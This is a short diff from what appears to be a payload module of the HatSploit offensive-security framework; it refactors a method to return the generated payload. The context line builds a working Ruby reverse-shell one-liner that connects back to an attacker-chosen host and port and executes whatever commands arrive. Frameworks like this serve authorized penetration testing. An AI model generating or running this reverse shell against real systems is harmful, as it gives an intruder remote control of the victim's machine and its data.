@@ -70,5 +70,4 @@ class HatSploitPayload(Payload, TCPClient):
         self.output_process("Generating payload...")
         payload = "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"" + local_host + "\",\"" + local_port + "\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
 
-        self.payload = payload
-        self.instructions = payload
+        return payload
